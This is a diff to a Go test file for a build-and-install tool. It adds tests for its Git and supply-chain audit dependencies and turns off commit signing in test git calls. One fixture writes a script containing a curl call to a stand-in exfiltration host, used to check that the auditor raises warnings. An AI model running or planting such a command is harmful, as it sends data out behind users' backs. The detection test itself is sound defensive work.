@@ -1,18 +1,57 @@
 package main
 
 import (
+	"context"
 	"os"
 	"os/exec"
 	"path/filepath"
 	"strings"
 	"testing"
 
+	"github.com/relux-works/curator/internal/buildrepo"
 	"github.com/relux-works/curator/internal/config"
 	"github.com/relux-works/curator/internal/godriver"
 	"github.com/relux-works/curator/internal/hashing"
 	"github.com/relux-works/curator/internal/manifest"
 	"github.com/relux-works/curator/internal/marker"
 )
+
+func TestProductionExternalDepsBindTrustedGitAndAudit(t *testing.T) {
+	deps := productionExternalDeps(&config.Config{}, true)
+	if err := buildrepo.ValidateGitTool(context.Background(), deps.GitTool); err != nil {
+		t.Fatalf("production Git dependency is unusable: %v", err)
+	}
+	if deps.AuditWarnings == nil {
+		t.Fatal("production external audit dependency is nil")
+	}
+	warnings, err := deps.AuditWarnings(context.Background(), buildrepo.AuditSubject{
+		Declared:     buildrepo.DeclaredState{Repository: "tools", Identity: "example.test/tools"},
+		Effective:    buildrepo.EffectiveState{Commit: strings.Repeat("1", 40)},
+		SnapshotRoot: t.TempDir(),
+	})
+	if err != nil || len(warnings) != 0 {
+		t.Fatalf("disabled configured audit rejected structurally valid subject: %v", err)
+	}
+}
+
+func TestProductionExternalAuditReturnsAdvisoryWarnings(t *testing.T) {
+	root := t.TempDir()
+	if err := os.Mkdir(filepath.Join(root, "scripts"), 0o700); err != nil {
+		t.Fatal(err)
+	}
+	if err := os.WriteFile(filepath.Join(root, "scripts", "tool"), []byte("curl https://exfil.example.net/x\n"), 0o600); err != nil {
+		t.Fatal(err)
+	}
+	cfg := &config.Config{Path: filepath.Join(t.TempDir(), "config.json"), Audit: config.Audit{Enabled: true, Mode: "advisory", FailOn: "high", Backend: "null"}}
+	deps := productionExternalDeps(cfg, true)
+	warnings, err := deps.AuditWarnings(context.Background(), buildrepo.AuditSubject{
+		Declared:  buildrepo.DeclaredState{Repository: "tools", Identity: "example.test/tools"},
+		Effective: buildrepo.EffectiveState{Commit: strings.Repeat("1", 40)}, SnapshotRoot: root,
+	})
+	if err != nil || len(warnings) == 0 {
+		t.Fatalf("advisory audit warnings=%v err=%v", warnings, err)
+	}
+}
 
 func TestUsageEnumeratesDocumentedCommands(t *testing.T) {
 	for _, command := range []string{
@@ -336,7 +375,11 @@ func TestCLIEndToEndInstallStatusAndTamperCheck(t *testing.T) {
 
 func runGit(t *testing.T, dir string, args ...string) {
 	t.Helper()
-	command := exec.Command("git", args...)
+	// Test repositories are data fixtures, never signing operations. Ignore
+	// workstation signing policy so credentials cannot be requested or folded
+	// into source/package inputs during lifecycle tests.
+	gitArgs := append([]string{"-c", "commit.gpgsign=false", "-c", "tag.gpgSign=false"}, args...)
+	command := exec.Command("git", gitArgs...)
 	command.Dir = dir
 	command.Env = append(os.Environ(),
 		"GIT_AUTHOR_NAME=Test", "GIT_AUTHOR_EMAIL=test@example.com",
